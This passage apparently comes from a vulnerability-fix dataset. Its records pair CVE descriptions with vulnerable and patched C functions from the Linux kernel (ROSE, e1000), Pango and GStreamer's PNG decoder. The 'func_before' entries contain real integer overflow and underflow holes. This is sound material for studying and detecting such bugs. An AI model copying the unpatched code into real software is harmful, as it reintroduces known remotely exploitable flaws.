buffer\\n\");\n\n\tif (sk->sk_state != TCP_ESTABLISHED) {\n\t\tkfree_skb(skb);\n\t\treturn -ENOTCONN;\n\t}\n\n#ifdef M_BIT\n#define ROSE_PACLEN (256-ROSE_MIN_LEN)\n\tif (skb->len - ROSE_MIN_LEN > ROSE_PACLEN) {\n\t\tunsigned char header[ROSE_MIN_LEN];\n\t\tstruct sk_buff *skbn;\n\t\tint frontlen;\n\t\tint lg;\n\n\t\t/* Save a copy of the Header */\n\t\tskb_copy_from_linear_data(skb, header, ROSE_MIN_LEN);\n\t\tskb_pull(skb, ROSE_MIN_LEN);\n\n\t\tfrontlen = skb_headroom(skb);\n\n\t\twhile (skb->len > 0) {\n\t\t\tif ((skbn = sock_alloc_send_skb(sk, frontlen + ROSE_PACLEN, 0, &err)) == NULL) {\n\t\t\t\tkfree_skb(skb);\n\t\t\t\treturn err;\n\t\t\t}\n\n\t\t\tskbn->sk   = sk;\n\t\t\tskbn->free = 1;\n\t\t\tskbn->arp  = 1;\n\n\t\t\tskb_reserve(skbn, frontlen);\n\n\t\t\tlg = (ROSE_PACLEN > skb->len) ? skb->len : ROSE_PACLEN;\n\n\t\t\t/* Copy the user data */\n\t\t\tskb_copy_from_linear_data(skb, skb_put(skbn, lg), lg);\n\t\t\tskb_pull(skb, lg);\n\n\t\t\t/* Duplicate the Header */\n\t\t\tskb_push(skbn, ROSE_MIN_LEN);\n\t\t\tskb_copy_to_linear_data(skbn, header, ROSE_MIN_LEN);\n\n\t\t\tif (skb->len > 0)\n\t\t\t\tskbn->data[2] |= M_BIT;\n\n\t\t\tskb_queue_tail(&sk->sk_write_queue, skbn); /* Throw it on the queue */\n\t\t}\n\n\t\tskb->free = 1;\n\t\tkfree_skb(skb);\n\t} else {\n\t\tskb_queue_tail(&sk->sk_write_queue, skb);\t\t/* Throw it on the queue */\n\t}\n#else\n\tskb_queue_tail(&sk->sk_write_queue, skb);\t/* Shove it onto the queue */\n#endif\n\n\trose_kick(sk);\n\n\treturn len;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -62,6 +62,10 @@\n \n \t/* Build a packet */\n \tSOCK_DEBUG(sk, \"ROSE: sendto: building packet.\\n\");\n+\t/* Sanity check the packet size */\n+\tif (len > 65535)\n+\t\treturn -EMSGSIZE;\n+\n \tsize = len + AX25_BPQ_HEADER_LEN + AX25_MAX_HEADER_LEN + ROSE_MIN_LEN;\n \n \tif ((skb = sock_alloc_send_skb(sk, size, msg->msg_flags & MSG_DONTWAIT, &err)) == NULL)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t/* Sanity check the packet size */",
                "\tif (len > 65535)",
                "\t\treturn -EMSGSIZE;",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1194",
        "func_name": "bratsche/pango/pango_glyph_string_set_size",
        "description": "Integer overflow in the pango_glyph_string_set_size function in pango/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.",
        "git_url": "https://github.com/bratsche/pango/commit/4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e",
        "commit_title": "[glyphstring] Handle overflow with very long glyphstrings",
        "commit_text": "",
        "func_before": "void\npango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n{\n  g_return_if_fail (new_len >= 0);\n\n  while (new_len > string->space)\n    {\n      if (string->space == 0)\n\tstring->space = 1;\n      else\n\tstring->space *= 2;\n\n      if (string->space < 0)\n\t{\n\t  g_warning (\"glyph string length overflows maximum integer size, truncated\");\n\t  new_len = string->space = G_MAXINT - 8;\n\t}\n    }\n\n  string->glyphs = g_realloc (string->glyphs, string->space * sizeof (PangoGlyphInfo));\n  string->log_clusters = g_realloc (string->log_clusters, string->space * sizeof (gint));\n  string->num_glyphs = new_len;\n}",
        "func": "void\npango_glyph_string_set_size (PangoGlyphString *string, gint new_len)\n{\n  g_return_if_fail (new_len >= 0);\n\n  while (new_len > string->space)\n    {\n      if (string->space == 0)\n\t{\n\t  string->space = 4;\n\t}\n      else\n\t{\n\t  const guint max_space =\n\t    MIN (G_MAXINT, G_MAXSIZE / MAX (sizeof(PangoGlyphInfo), sizeof(gint)));\n\n\t  guint more_space = (guint)string->space * 2;\n\n\t  if (more_space > max_space)\n\t    {\n\t      more_space = max_space;\n\n\t      if ((guint)new_len > max_space)\n\t\t{\n\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",\n\t\t\t   G_STRLOC, new_len);\n\t\t}\n\t    }\n\n\t  string->space = more_space;\n\t}\n    }\n\n  string->glyphs = g_realloc (string->glyphs, string->space * sizeof (PangoGlyphInfo));\n  string->log_clusters = g_realloc (string->log_clusters, string->space * sizeof (gint));\n  string->num_glyphs = new_len;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,14 +6,28 @@\n   while (new_len > string->space)\n     {\n       if (string->space == 0)\n-\tstring->space = 1;\n+\t{\n+\t  string->space = 4;\n+\t}\n       else\n-\tstring->space *= 2;\n+\t{\n+\t  const guint max_space =\n+\t    MIN (G_MAXINT, G_MAXSIZE / MAX (sizeof(PangoGlyphInfo), sizeof(gint)));\n \n-      if (string->space < 0)\n-\t{\n-\t  g_warning (\"glyph string length overflows maximum integer size, truncated\");\n-\t  new_len = string->space = G_MAXINT - 8;\n+\t  guint more_space = (guint)string->space * 2;\n+\n+\t  if (more_space > max_space)\n+\t    {\n+\t      more_space = max_space;\n+\n+\t      if ((guint)new_len > max_space)\n+\t\t{\n+\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",\n+\t\t\t   G_STRLOC, new_len);\n+\t\t}\n+\t    }\n+\n+\t  string->space = more_space;\n \t}\n     }\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\tstring->space = 1;",
                "\tstring->space *= 2;",
                "      if (string->space < 0)",
                "\t{",
                "\t  g_warning (\"glyph string length overflows maximum integer size, truncated\");",
                "\t  new_len = string->space = G_MAXINT - 8;"
            ],
            "added_lines": [
                "\t{",
                "\t  string->space = 4;",
                "\t}",
                "\t{",
                "\t  const guint max_space =",
                "\t    MIN (G_MAXINT, G_MAXSIZE / MAX (sizeof(PangoGlyphInfo), sizeof(gint)));",
                "\t  guint more_space = (guint)string->space * 2;",
                "",
                "\t  if (more_space > max_space)",
                "\t    {",
                "\t      more_space = max_space;",
                "",
                "\t      if ((guint)new_len > max_space)",
                "\t\t{",
                "\t\t  g_error (\"%s: failed to allocate glyph string of length %i\\n\",",
                "\t\t\t   G_STRLOC, new_len);",
                "\t\t}",
                "\t    }",
                "",
                "\t  string->space = more_space;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1385",
        "func_name": "torvalds/linux/e1000_clean_rx_irq",
        "description": "Integer underflow in the e1000_clean_rx_irq function in drivers/net/e1000/e1000_main.c in the e1000 driver in the Linux kernel before 2.6.30-rc8, the e1000e driver in the Linux kernel, and Intel Wired Ethernet (aka e1000) before 7.5.5 allows remote attackers to cause a denial of service (panic) via a crafted frame size.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=ea30e11970a96cfe5e32c03a29332554573b4a10",
        "commit_title": "\tPatch to fix bad length checking in e1000.  E1000 by default does two",
        "commit_text": "things:  1) Spans rx descriptors for packets that don't fit into 1 skb on recieve 2) Strips the crc from a frame by subtracting 4 bytes from the length prior to doing an skb_put  Since the e1000 driver isn't written to support receiving packets that span multiple rx buffers, it checks the End of Packet bit of every frame, and discards it if its not set.  This places us in a situation where, if we have a spanning packet, the first part is discarded, but the second part is not (since it is the end of packet, and it passes the EOP bit test).  If the second part of the frame is small (4 bytes or less), we subtract 4 from it to remove its crc, underflow the length, and wind up in skb_over_panic, when we try to skb_put a huge number of bytes into the skb.  This amounts to a remote DOS attack through careful selection of frame size in relation to interface MTU.  The fix for this is already in the e1000e driver, as well as the e1000 sourceforge driver, but no one ever pushed it to e1000.  This is lifted straight from e1000e, and prevents small frames from causing the underflow described above  ",
        "func_before": "static bool e1000_clean_rx_irq(struct e1000_adapter *adapter,\n\t\t\t       struct e1000_rx_ring *rx_ring,\n\t\t\t       int *work_done, int work_to_do)\n{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tstruct net_device *netdev = adapter->netdev;\n\tstruct pci_dev *pdev = adapter->pdev;\n\tstruct e1000_rx_desc *rx_desc, *next_rxd;\n\tstruct e1000_buffer *buffer_info, *next_buffer;\n\tunsigned long flags;\n\tu32 length;\n\tu8 last_byte;\n\tunsigned int i;\n\tint cleaned_count = 0;\n\tbool cleaned = false;\n\tunsigned int total_rx_bytes=0, total_rx_packets=0;\n\n\ti = rx_ring->next_to_clean;\n\trx_desc = E1000_RX_DESC(*rx_ring, i);\n\tbuffer_info = &rx_ring->buffer_info[i];\n\n\twhile (rx_desc->status & E1000_RXD_STAT_DD) {\n\t\tstruct sk_buff *skb;\n\t\tu8 status;\n\n\t\tif (*work_done >= work_to_do)\n\t\t\tbreak;\n\t\t(*work_done)++;\n\n\t\tstatus = rx_desc->status;\n\t\tskb = buffer_info->skb;\n\t\tbuffer_info->skb = NULL;\n\n\t\tprefetch(skb->data - NET_IP_ALIGN);\n\n\t\tif (++i == rx_ring->count) i = 0;\n\t\tnext_rxd = E1000_RX_DESC(*rx_ring, i);\n\t\tprefetch(next_rxd);\n\n\t\tnext_buffer = &rx_ring->buffer_info[i];\n\n\t\tcleaned = true;\n\t\tcleaned_count++;\n\t\tpci_unmap_single(pdev,\n\t\t                 buffer_info->dma,\n\t\t                 buffer_info->length,\n\t\t                 PCI_DMA_FROMDEVICE);\n\n\t\tlength = le16_to_cpu(rx_desc->length);\n\n\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP))) {\n\t\t\t/* All receives must fit into a single buffer */\n\t\t\tE1000_DBG(\"%s: Receive packet consumed multiple\"\n\t\t\t\t  \" buffers\\n\", netdev->name);\n\t\t\t/* recycle */\n\t\t\tbuffer_info->skb = skb;\n\t\t\tgoto next_desc;\n\t\t}\n\n\t\tif (unlikely(rx_desc->errors & E1000_RXD_ERR_FRAME_ERR_MASK)) {\n\t\t\tlast_byte = *(skb->data + length - 1);\n\t\t\tif (TBI_ACCEPT(hw, status, rx_desc->errors, length,\n\t\t\t\t       last_byte)) {\n\t\t\t\tspin_lock_irqsave(&adapter->stats_lock, flags);\n\t\t\t\te1000_tbi_adjust_stats(hw, &adapter->stats,\n\t\t\t\t                       length, skb->data);\n\t\t\t\tspin_unlock_irqrestore(&adapter->stats_lock,\n\t\t\t\t                       flags);\n\t\t\t\tlength--;\n\t\t\t} else {\n\t\t\t\t/* recycle */\n\t\t\t\tbuffer_info->skb = skb;\n\t\t\t\tgoto next_desc;\n\t\t\t}\n\t\t}\n\n\t\t/* adjust length to remove Ethernet CRC, this must be\n\t\t * done after the TBI_ACCEPT workaround above */\n\t\tlength -= 4;\n\n\t\t/* probably a little skewed due to removing CRC */\n\t\ttotal_rx_bytes += length;\n\t\ttotal_rx_packets++;\n\n\t\t/* code added for copybreak, this should improve\n\t\t * performance for small packets with large amounts\n\t\t * of reassembly being done in the stack */\n\t\tif (length < copybreak) {\n\t\t\tstruct sk_buff *new_skb =\n\t\t\t    netdev_alloc_skb(netdev, length + NET_IP_ALIGN);\n\t\t\tif (new_skb) {\n\t\t\t\tskb_reserve(new_skb, NET_IP_ALIGN);\n\t\t\t\tskb_copy_to_linear_data_offset(new_skb,\n\t\t\t\t\t\t\t       -NET_IP_ALIGN,\n\t\t\t\t\t\t\t       (skb->data -\n\t\t\t\t\t\t\t        NET_IP_ALIGN),\n\t\t\t\t\t\t\t       (length +\n\t\t\t\t\t\t\t        NET_IP_ALIGN));\n\t\t\t\t/* save the skb in buffer_info as good */\n\t\t\t\tbuffer_info->skb = skb;\n\t\t\t\tskb = new_skb;\n\t\t\t}\n\t\t\t/* else just continue with the old one */\n\t\t}\n\t\t/* end copybreak code */\n\t\tskb_put(skb, length);\n\n\t\t/* Receive Checksum Offload */\n\t\te1000_rx_checksum(adapter,\n\t\t\t\t  (u32)(status) |\n\t\t\t\t  ((u32)(rx_desc->errors) << 24),\n\t\t\t\t  le16_to_cpu(rx_desc->csum), skb);\n\n\t\tskb->protocol = eth_type_trans(skb, netdev);\n\n\t\tif (unlikely(adapter->vlgrp &&\n\t\t\t    (status & E1000_RXD_STAT_VP))) {\n\t\t\tvlan_hwaccel_receive_skb(skb, adapter->vlgrp,\n\t\t\t\t\t\t le16_to_cpu(rx_desc->special));\n\t\t} else {\n\t\t\tnetif_receive_skb(skb);\n\t\t}\n\nnext_desc:\n\t\trx_desc->status = 0;\n\n\t\t/* return some buffers to hardware, one at a time is too slow */\n\t\tif (unlikely(cleaned_count >= E1000_RX_BUFFER_WRITE)) {\n\t\t\tadapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);\n\t\t\tcleaned_count = 0;\n\t\t}\n\n\t\t/* use prefetched values */\n\t\trx_desc = next_rxd;\n\t\tbuffer_info = next_buffer;\n\t}\n\trx_ring->next_to_clean = i;\n\n\tcleaned_count = E1000_DESC_UNUSED(rx_ring);\n\tif (cleaned_count)\n\t\tadapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);\n\n\tadapter->total_rx_packets += total_rx_packets;\n\tadapter->total_rx_bytes += total_rx_bytes;\n\tadapter->net_stats.rx_bytes += total_rx_bytes;\n\tadapter->net_stats.rx_packets += total_rx_packets;\n\treturn cleaned;\n}",
        "func": "static bool e1000_clean_rx_irq(struct e1000_adapter *adapter,\n\t\t\t       struct e1000_rx_ring *rx_ring,\n\t\t\t       int *work_done, int work_to_do)\n{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tstruct net_device *netdev = adapter->netdev;\n\tstruct pci_dev *pdev = adapter->pdev;\n\tstruct e1000_rx_desc *rx_desc, *next_rxd;\n\tstruct e1000_buffer *buffer_info, *next_buffer;\n\tunsigned long flags;\n\tu32 length;\n\tu8 last_byte;\n\tunsigned int i;\n\tint cleaned_count = 0;\n\tbool cleaned = false;\n\tunsigned int total_rx_bytes=0, total_rx_packets=0;\n\n\ti = rx_ring->next_to_clean;\n\trx_desc = E1000_RX_DESC(*rx_ring, i);\n\tbuffer_info = &rx_ring->buffer_info[i];\n\n\twhile (rx_desc->status & E1000_RXD_STAT_DD) {\n\t\tstruct sk_buff *skb;\n\t\tu8 status;\n\n\t\tif (*work_done >= work_to_do)\n\t\t\tbreak;\n\t\t(*work_done)++;\n\n\t\tstatus = rx_desc->status;\n\t\tskb = buffer_info->skb;\n\t\tbuffer_info->skb = NULL;\n\n\t\tprefetch(skb->data - NET_IP_ALIGN);\n\n\t\tif (++i == rx_ring->count) i = 0;\n\t\tnext_rxd = E1000_RX_DESC(*rx_ring, i);\n\t\tprefetch(next_rxd);\n\n\t\tnext_buffer = &rx_ring->buffer_info[i];\n\n\t\tcleaned = true;\n\t\tcleaned_count++;\n\t\tpci_unmap_single(pdev,\n\t\t                 buffer_info->dma,\n\t\t                 buffer_info->length,\n\t\t                 PCI_DMA_FROMDEVICE);\n\n\t\tlength = le16_to_cpu(rx_desc->length);\n\t\t/* !EOP means multiple descriptors were used to store a single\n\t\t * packet, also make sure the frame isn't just CRC only */\n\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP) || (length <= 4))) {\n\t\t\t/* All receives must fit into a single buffer */\n\t\t\tE1000_DBG(\"%s: Receive packet consumed multiple\"\n\t\t\t\t  \" buffers\\n\", netdev->name);\n\t\t\t/* recycle */\n\t\t\tbuffer_info->skb = skb;\n\t\t\tgoto next_desc;\n\t\t}\n\n\t\tif (unlikely(rx_desc->errors & E1000_RXD_ERR_FRAME_ERR_MASK)) {\n\t\t\tlast_byte = *(skb->data + length - 1);\n\t\t\tif (TBI_ACCEPT(hw, status, rx_desc->errors, length,\n\t\t\t\t       last_byte)) {\n\t\t\t\tspin_lock_irqsave(&adapter->stats_lock, flags);\n\t\t\t\te1000_tbi_adjust_stats(hw, &adapter->stats,\n\t\t\t\t                       length, skb->data);\n\t\t\t\tspin_unlock_irqrestore(&adapter->stats_lock,\n\t\t\t\t                       flags);\n\t\t\t\tlength--;\n\t\t\t} else {\n\t\t\t\t/* recycle */\n\t\t\t\tbuffer_info->skb = skb;\n\t\t\t\tgoto next_desc;\n\t\t\t}\n\t\t}\n\n\t\t/* adjust length to remove Ethernet CRC, this must be\n\t\t * done after the TBI_ACCEPT workaround above */\n\t\tlength -= 4;\n\n\t\t/* probably a little skewed due to removing CRC */\n\t\ttotal_rx_bytes += length;\n\t\ttotal_rx_packets++;\n\n\t\t/* code added for copybreak, this should improve\n\t\t * performance for small packets with large amounts\n\t\t * of reassembly being done in the stack */\n\t\tif (length < copybreak) {\n\t\t\tstruct sk_buff *new_skb =\n\t\t\t    netdev_alloc_skb(netdev, length + NET_IP_ALIGN);\n\t\t\tif (new_skb) {\n\t\t\t\tskb_reserve(new_skb, NET_IP_ALIGN);\n\t\t\t\tskb_copy_to_linear_data_offset(new_skb,\n\t\t\t\t\t\t\t       -NET_IP_ALIGN,\n\t\t\t\t\t\t\t       (skb->data -\n\t\t\t\t\t\t\t        NET_IP_ALIGN),\n\t\t\t\t\t\t\t       (length +\n\t\t\t\t\t\t\t        NET_IP_ALIGN));\n\t\t\t\t/* save the skb in buffer_info as good */\n\t\t\t\tbuffer_info->skb = skb;\n\t\t\t\tskb = new_skb;\n\t\t\t}\n\t\t\t/* else just continue with the old one */\n\t\t}\n\t\t/* end copybreak code */\n\t\tskb_put(skb, length);\n\n\t\t/* Receive Checksum Offload */\n\t\te1000_rx_checksum(adapter,\n\t\t\t\t  (u32)(status) |\n\t\t\t\t  ((u32)(rx_desc->errors) << 24),\n\t\t\t\t  le16_to_cpu(rx_desc->csum), skb);\n\n\t\tskb->protocol = eth_type_trans(skb, netdev);\n\n\t\tif (unlikely(adapter->vlgrp &&\n\t\t\t    (status & E1000_RXD_STAT_VP))) {\n\t\t\tvlan_hwaccel_receive_skb(skb, adapter->vlgrp,\n\t\t\t\t\t\t le16_to_cpu(rx_desc->special));\n\t\t} else {\n\t\t\tnetif_receive_skb(skb);\n\t\t}\n\nnext_desc:\n\t\trx_desc->status = 0;\n\n\t\t/* return some buffers to hardware, one at a time is too slow */\n\t\tif (unlikely(cleaned_count >= E1000_RX_BUFFER_WRITE)) {\n\t\t\tadapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);\n\t\t\tcleaned_count = 0;\n\t\t}\n\n\t\t/* use prefetched values */\n\t\trx_desc = next_rxd;\n\t\tbuffer_info = next_buffer;\n\t}\n\trx_ring->next_to_clean = i;\n\n\tcleaned_count = E1000_DESC_UNUSED(rx_ring);\n\tif (cleaned_count)\n\t\tadapter->alloc_rx_buf(adapter, rx_ring, cleaned_count);\n\n\tadapter->total_rx_packets += total_rx_packets;\n\tadapter->total_rx_bytes += total_rx_bytes;\n\tadapter->net_stats.rx_bytes += total_rx_bytes;\n\tadapter->net_stats.rx_packets += total_rx_packets;\n\treturn cleaned;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -47,8 +47,9 @@\n \t\t                 PCI_DMA_FROMDEVICE);\n \n \t\tlength = le16_to_cpu(rx_desc->length);\n-\n-\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP))) {\n+\t\t/* !EOP means multiple descriptors were used to store a single\n+\t\t * packet, also make sure the frame isn't just CRC only */\n+\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP) || (length <= 4))) {\n \t\t\t/* All receives must fit into a single buffer */\n \t\t\tE1000_DBG(\"%s: Receive packet consumed multiple\"\n \t\t\t\t  \" buffers\\n\", netdev->name);",
        "diff_line_info": {
            "deleted_lines": [
                "",
                "\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP))) {"
            ],
            "added_lines": [
                "\t\t/* !EOP means multiple descriptors were used to store a single",
                "\t\t * packet, also make sure the frame isn't just CRC only */",
                "\t\tif (unlikely(!(status & E1000_RXD_STAT_EOP) || (length <= 4))) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1932",
        "func_name": "gstreamer/gst-plugins-good/user_endrow_callback",
        "description": "Multiple integer overflows in the (1) user_info_callback, (2) user_endrow_callback, and (3) gst_pngdec_task functions (ext/libpng/gstpngdec.c) in GStreamer Good Plug-ins (aka gst-plugins-good or gstreamer-plugins-good) 0.10.15 allow remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted PNG file, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/gstreamer/gst-plugins-good/commit/?id=d9544bcc44adcef769cbdf7f6453e140058a3adc",
        "commit_title": "A malformed (or simply huge) PNG file can lead to integer overflow in",
        "commit_text": "calculating the size of the output buffer, leading to crashes or buffer overflows later. Fixes SA35205 security advisory. ",
        "func_before": "static void\nuser_endrow_callback (png_structp png_ptr, png_bytep new_row,\n    png_uint_32 row_num, int pass)\n{\n  GstPngDec *pngdec = NULL;\n\n  pngdec = GST_PNGDEC (png_ptr->io_ptr);\n\n  /* FIXME: implement interlaced pictures */\n\n  /* If buffer_out doesn't exist, it means buffer_alloc failed, which \n   * will already have set the return code */\n  if (GST_IS_BUFFER (pngdec->buffer_out)) {\n    size_t offset = row_num * GST_ROUND_UP_4 (pngdec->rowbytes);\n\n    GST_LOG (\"got row %u, copying in buffer %p at offset %\" G_GSIZE_FORMAT,\n        (guint) row_num, pngdec->buffer_out, offset);\n    memcpy (GST_BUFFER_DATA (pngdec->buffer_out) + offset, new_row,\n        pngdec->rowbytes);\n    pngdec->ret = GST_FLOW_OK;\n  }\n}",
        "func": "static void\nuser_endrow_callback (png_structp png_ptr, png_bytep new_row,\n    png_uint_32 row_num, int pass)\n{\n  GstPngDec *pngdec = NULL;\n\n  pngdec = GST_PNGDEC (png_ptr->io_ptr);\n\n  /* FIXME: implement interlaced pictures */\n\n  /* If buffer_out doesn't exist, it means buffer_alloc failed, which \n   * will already have set the return code */\n  if (GST_IS_BUFFER (pngdec->buffer_out)) {\n    size_t offset = row_num * pngdec->rowbytes;\n\n    GST_LOG (\"got row %u, copying in buffer %p at offset %\" G_GSIZE_FORMAT,\n        (guint) row_num, pngdec->buffer_out, offset);\n    memcpy (GST_BUFFER_DATA (pngdec->buffer_out) + offset, new_row,\n        pngdec->rowbytes);\n    pngdec->ret = GST_FLOW_OK;\n  }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -11,7 +11,7 @@\n   /* If buffer_out doesn't exist, it means buffer_alloc failed, which \n    * will already have set the return code */\n   if (GST_IS_BUFFER (pngdec->buffer_out)) {\n-    size_t offset = row_num * GST_ROUND_UP_4 (pngdec->rowbytes);\n+    size_t offset = row_num * pngdec->rowbytes;\n \n     GST_LOG (\"got row %u, copying in buffer %p at offset %\" G_GSIZE_FORMAT,\n         (guint) row_num, pngdec->buffer_out, offset);",
        "diff_line_info": {
            "deleted_lines": [
                "    size_t offset = row_num * GST_ROUND_UP_4 (pngdec->rowbytes);"
            ],
            "added_lines": [
                "    size_t offset = row_num * pngdec->rowbytes;"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1932",
        "func_name": "gstreamer/gst-plugins-good/gst_pngdec_task",
        "description": "Multiple integer overflows in the (1) user_info_callback, (2) user_endrow_callback, and (3) gst_pngdec_task functions (ext/libpng/gstpngdec.c) in GStreamer Good Plug-ins (aka gst-plugins-good or gstreamer-plugins-good) 0.10.15 allow remote attackers to cause a denial of service and possibly execute arbitrary code via a crafted PNG file, which triggers a buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/gstreamer/gst-plugins-good/commit/?id=d9544bcc44adcef769cbdf7f6453e140058a3adc",
        "commit_title": "A malformed (or simply huge) PNG file can lead to integer overflow in",
        "commit_text": "calculating the size of the output buffer, leading to crashes or buffer overflows later. Fixes SA35205 security advisory. ",
        "func_before": "static void\ngst_pngdec_task (GstPad * pad)\n{\n  GstPngDec *pngdec;\n  GstBuffer *buffer = NULL;\n  size_t buffer_size = 0;\n  gint i = 0;\n  png_bytep *rows, inp;\n  png_uint_32 rowbytes;\n  GstFlowReturn ret = GST_FLOW_OK;\n\n  pngdec = GST_PNGDEC (GST_OBJECT_PARENT (pad));\n\n  GST_LOG_OBJECT (pngdec, \"read frame\");\n\n  /* Let libpng come back here on error */\n  if (setjmp (png_jmpbuf (pngdec->png))) {\n    ret = GST_FLOW_ERROR;\n    goto pause;\n  }\n\n  /* Set reading callback */\n  png_set_read_fn (pngdec->png, pngdec, user_read_data);\n\n  /* Read info */\n  png_read_info (pngdec->png, pngdec->info);\n\n  /* Generate the caps and configure */\n  ret = gst_pngdec_caps_create_and_set (pngdec);\n  if (ret != GST_FLOW_OK) {\n    goto pause;\n  }\n\n  /* Allocate output buffer */\n  rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n  buffer_size = pngdec->height * GST_ROUND_UP_4 (rowbytes);\n  ret =\n      gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n      buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n  if (ret != GST_FLOW_OK)\n    goto pause;\n\n  rows = (png_bytep *) g_malloc (sizeof (png_bytep) * pngdec->height);\n\n  inp = GST_BUFFER_DATA (buffer);\n\n  for (i = 0; i < pngdec->height; i++) {\n    rows[i] = inp;\n    inp += GST_ROUND_UP_4 (rowbytes);\n  }\n\n  /* Read the actual picture */\n  png_read_image (pngdec->png, rows);\n  g_free (rows);\n\n  /* Push the raw RGB frame */\n  ret = gst_pad_push (pngdec->srcpad, buffer);\n  if (ret != GST_FLOW_OK)\n    goto pause;\n\n  /* And we are done */\n  gst_pad_pause_task (pngdec->sinkpad);\n  gst_pad_push_event (pngdec->srcpad, gst_event_new_eos ());\n  return;\n\npause:\n  {\n    GST_INFO_OBJECT (pngdec, \"pausing task, reason %s\",\n        gst_flow_get_name (ret));\n    gst_pad_pause_task (pngdec->sinkpad);\n    if (GST_FLOW_IS_FATAL (ret) || ret == GST_FLOW_NOT_LINKED) {\n      GST_ELEMENT_ERROR (pngdec, STREAM, FAILED,\n          (_(\"Internal data stream error.\")),\n          (\"stream stopped, reason %s\", gst_flow_get_name (ret)));\n      gst_pad_push_event (pngdec->srcpad, gst_event_new_eos ());\n    }\n  }\n}",
        "func": "static void\ngst_pngdec_task (GstPad * pad)\n{\n  GstPngDec *pngdec;\n  GstBuffer *buffer = NULL;\n  size_t buffer_size = 0;\n  gint i = 0;\n  png_bytep *rows, inp;\n  png_uint_32 rowbytes;\n  GstFlowReturn ret = GST_FLOW_OK;\n\n  pngdec = GST_PNGDEC (GST_OBJECT_PARENT (pad));\n\n  GST_LOG_OBJECT (pngdec, \"read frame\");\n\n  /* Let libpng come back here on error */\n  if (setjmp (png_jmpbuf (pngdec->png))) {\n    ret = GST_FLOW_ERROR;\n    goto pause;\n  }\n\n  /* Set reading callback */\n  png_set_read_fn (pngdec->png, pngdec, user_read_data);\n\n  /* Read info */\n  png_read_info (pngdec->png, pngdec->info);\n\n  /* Generate the caps and configure */\n  ret = gst_pngdec_caps_create_and_set (pngdec);\n  if (ret != GST_FLOW_OK) {\n    goto pause;\n  }\n\n  /* Allocate output buffer */\n  rowbytes = png_get_rowbytes (pngdec->png, pngdec->info);\n  if (rowbytes > (G_MAXUINT32 - 3) || pngdec->height > G_MAXUINT32 / rowbytes) {\n    ret = GST_FLOW_ERROR;\n    goto pause;\n  }\n  rowbytes = GST_ROUND_UP_4 (rowbytes);\n  buffer_size = pngdec->height * rowbytes;\n  ret =\n      gst_pad_alloc_buffer_and_set_caps (pngdec->srcpad, GST_BUFFER_OFFSET_NONE,\n      buffer_size, GST_PAD_CAPS (pngdec->srcpad), &buffer);\n  if (ret != GST_FLOW_OK)\n    goto pause;\n\n  rows = (png_bytep *) g_malloc (sizeof (png_bytep) * pngdec->height);\n\n  inp = GST_BUFFER_DATA (buffer);\n\n  for (i = 0; i < pngdec->height; i++) {\n    rows[i] = inp;\n    inp += rowbytes;\n  }\n\n  /* Read the actual picture */\n  png_read_image (pngdec->png, rows);\n  g_free (rows);\n\n  /* Push the raw RGB frame */\n  ret = gst_pad_push (pngdec->srcpad, buffer);\n  if (ret != GST_FLOW_OK)\n    goto pause;\n\n  /* And we are done */\n  gst_pad_pause_task (pngdec->sinkpad);\n  gst_pad_push_event (pngdec->srcpad, gst_event_new_eos ());\n  return;\n\npause:\n  {\n    GST_INFO_OBJECT (pngdec, \"pausing task, reason %s\",\n        gst_flow_get_name (ret));\n    gst_pad_pause_task (pngdec->sinkpad);\n    if (GST_FLOW_IS_FATAL (ret) || ret == GST_FLOW_NOT_LINKED) {\n      GST_ELEMENT_ERROR (pngdec, STREAM, FAILED,\n          (_(\"Internal data stream error.\")),\n          (\"stream stopped, reason %s\", gst_flow_get_name (ret)));\n      gst_pad_push_event (pngdec->srcpad, gst_event_new_eos ());\n    }\n  }\n}",
